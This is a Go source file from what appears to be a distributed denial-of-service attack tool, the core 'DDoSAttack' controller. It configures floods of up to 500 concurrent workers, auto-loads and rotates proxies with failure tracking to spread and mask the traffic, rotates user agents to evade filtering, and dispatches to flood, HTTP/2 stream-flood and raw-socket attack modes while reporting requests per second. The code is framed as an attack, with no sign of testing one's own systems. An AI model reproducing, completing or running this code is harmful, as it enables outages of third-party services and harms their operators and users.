package ddos

import (
	"context"
	"fmt"
	"sync/atomic"
	"time"
)

// New creates a new DDoS attack instance
func New(config DDoSConfig) *DDoSAttack {
	// Set defaults
	if config.Method == "" {
		config.Method = "GET"
	}
	if config.MaxThreads <= 0 {
		config.MaxThreads = 500
	}
	if config.Duration <= 0 {
		config.Duration = 60 * time.Second
	}
	if config.Timeout <= 0 {
		config.Timeout = 5 * time.Second
	}
	if config.AttackMode == "" {
		config.AttackMode = ModeFlood
	}
	if config.Headers == nil {
		config.Headers = make(map[string]string)
	}
	if config.MaxStreamsPerConn <= 0 {
		config.MaxStreamsPerConn = 100 // Default HTTP/2 streams per connection
	}

	// Auto-load proxies from default file if ProxyList is empty
	if len(config.ProxyList) == 0 {
		if proxies, err := loadProxiesFromFile(); err == nil && len(proxies) > 0 {
			config.ProxyList = proxies
			// Enable proxy rotation by default when proxies are auto-loaded
			if !config.RotateProxy {
				config.RotateProxy = true
			}
		}
	}

	if !config.RotateProxy && len(config.ProxyList) > 0 {
		config.RotateProxy = true // Default to true for load distribution
	}

	attack := &DDoSAttack{
		config:         config,
		proxyFailures:  make(map[string]int),
		proxyDisabled:  make(map[string]bool),
		proxyFailLimit: 5, // mark proxy unhealthy after 5 consecutive failures
	}

	// Initialize proxy list snapshot for this attack instance
	if len(config.ProxyList) > 0 {
		attack.proxies = append([]string(nil), config.ProxyList...)
	}

	// Load user agents (auto-load from default file, fallback to built-in)
	if config.UserAgentFile != "" {
		// Use custom user agent file if specified
		if agents, err := loadUserAgentsFromFile(config.UserAgentFile); err == nil && len(agents) > 0 {
			attack.userAgents = agents
		} else {
			// Fallback to built-in agents if file loading fails
			attack.userAgents = getBuiltInUserAgents()
		}
	} else {
		// Auto-load from default user-agent.txt file
		if agents, err := loadUserAgentsFromDefaultFile(); err == nil && len(agents) > 0 {
			attack.userAgents = agents
		} else {
			// Fallback to built-in user agents if file loading fails
			attack.userAgents = getBuiltInUserAgents()
		}
	}

	return attack
}

// Start begins the DDoS attack
func (d *DDoSAttack) Start(ctx context.Context) error {
	d.mu.Lock()
	if d.running {
		d.mu.Unlock()
		return fmt.Errorf("attack already running")
	}
	d.running = true
	d.mu.Unlock()

	// Create cancellable context with timeout
	d.ctx, d.cancel = context.WithTimeout(ctx, d.config.Duration)
	d.startTime = time.Now()

	// Reset counters
	atomic.StoreInt64(&d.requestsSent, 0)
	atomic.StoreInt64(&d.requestsSuccess, 0)
	atomic.StoreInt64(&d.requestsFailed, 0)
	atomic.StoreInt64(&d.bytesSent, 0)
	atomic.StoreInt64(&d.bytesReceived, 0)
	atomic.StoreInt64(&d.activeConns, 0)
	atomic.StoreInt64(&d.totalResponseTime, 0)
	atomic.StoreInt64(&d.poolHits, 0)
	atomic.StoreInt64(&d.poolMisses, 0)
	atomic.StoreInt64(&d.totalBatches, 0)
	atomic.StoreInt64(&d.successfulBatches, 0)

	// Start progress reporter
	go d.reportProgress()

	// Start workers based on attack mode
	switch d.config.AttackMode {
	case ModeFlood:
		d.startFloodAttack()
	case ModeHTTP2:
		d.startHTTP2StreamFlood()
	case ModeRaw:
		d.startRawSocketAttack()
	default:
		// Default to flood if unknown mode
		d.startFloodAttack()
	}

	return nil
}


// Wait waits for the attack to complete
func (d *DDoSAttack) Wait() {
	d.wg.Wait()
	d.mu.Lock()
	d.running = false
	d.mu.Unlock()
}

// Stop stops the attack gracefully
func (d *DDoSAttack) Stop() {
	if d.cancel != nil {
		d.cancel()
	}
}

// GetStats returns current attack statistics
func (d *DDoSAttack) GetStats() AttackStats {
	elapsed := time.Since(d.startTime)
	sent := atomic.LoadInt64(&d.requestsSent)
	totalRespTime := atomic.LoadInt64(&d.totalResponseTime)

	var avgRespTime time.Duration
	if sent > 0 {
		avgRespTime = time.Duration(totalRespTime / sent)
	}

	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(sent) / elapsed.Seconds()
	}

	// Compute proxy health stats
	activeProxies := 0
	disabledProxies := 0
	if len(d.proxies) > 0 {
		d.proxyMu.Lock()
		for _, p := range d.proxies {
			if d.proxyDisabled[p] {
				disabledProxies++
			} else {
				activeProxies++
			}
		}
		d.proxyMu.Unlock()
	}

	// Calculate efficiency statistics
	poolHits := atomic.LoadInt64(&d.poolHits)
	poolMisses := atomic.LoadInt64(&d.poolMisses)
	totalPoolRequests := poolHits + poolMisses
	var poolHitRate float64
	if totalPoolRequests > 0 {
		poolHitRate = float64(poolHits) / float64(totalPoolRequests)
	}

	return AttackStats{
		RequestsSent:      sent,
		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
		RequestsFailed:    atomic.LoadInt64(&d.requestsFailed),
		BytesSent:         atomic.LoadInt64(&d.bytesSent),
		BytesReceived:     atomic.LoadInt64(&d.bytesReceived),
		ActiveConnections: atomic.LoadInt64(&d.activeConns),
		AvgResponseTime:   avgRespTime,
		ElapsedTime:       elapsed,
		RequestsPerSec:    rps,
		ActiveProxies:     activeProxies,
		DisabledProxies:   disabledProxies,
		ConnectionsReused: poolHits,
		PoolHitRate:       poolHitRate,
	}
}

// getNextProxy returns the next healthy proxy for rotation, or false if none available.
func (d *DDoSAttack) getNextProxy() (string, bool) {
	if len(d.proxies) == 0 {
		return "", false
	}

	// Try up to len(proxies) times to find a non-disabled proxy
	for i := 0; i < len(d.proxies); i++ {
		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
		p := d.proxies[int(idx)%len(d.proxies)]

		d.proxyMu.Lock()
		disabled := d.proxyDisabled[p]
		d.proxyMu.Unlock()

		if !disabled {
			return p, true
		}
	}

	return "", false
}

// markProxyFailure records a failed request for the given proxy and may mark it unhealthy.
func (d *DDoSAttack) markProxyFailure(proxy string) {
	if proxy == "" {
		return
	}
	d.proxyMu.Lock()
	defer d.proxyMu.Unlock()

	failures := d.proxyFailures[proxy] + 1
	d.proxyFailures[proxy] = failures
	if failures >= d.proxyFailLimit {
		d.proxyDisabled[proxy] = true
	}
}

// markProxySuccess resets the failure counter for a proxy on successful use.
func (d *DDoSAttack) markProxySuccess(proxy string) {
	if proxy == "" {
		return
	}
	d.proxyMu.Lock()
	defer d.proxyMu.Unlock()

	d.proxyFailures[proxy] = 0
}

// IsRunning returns whether the attack is currently running
func (d *DDoSAttack) IsRunning() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.running
}

// reportProgress periodically calls the progress callback
func (d *DDoSAttack) reportProgress() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			// Final stats report
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
			return
		case <-ticker.C:
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
		}
	}
}
